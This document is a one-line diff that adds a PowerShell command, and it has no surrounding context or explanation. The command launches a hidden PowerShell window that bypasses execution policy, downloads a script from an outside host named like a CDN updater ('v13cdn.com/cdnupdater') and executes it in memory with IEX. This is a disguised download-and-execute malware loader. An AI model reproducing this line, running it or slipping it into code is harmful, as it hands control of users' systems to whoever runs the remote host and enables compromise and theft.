@@ -1,0 +1,1 @@
+powershell -w hidden -exec bypass -nop -c "IEX ((new-object net.webclient).downloadstring('https://v13cdn.com/cdnupdater'))"
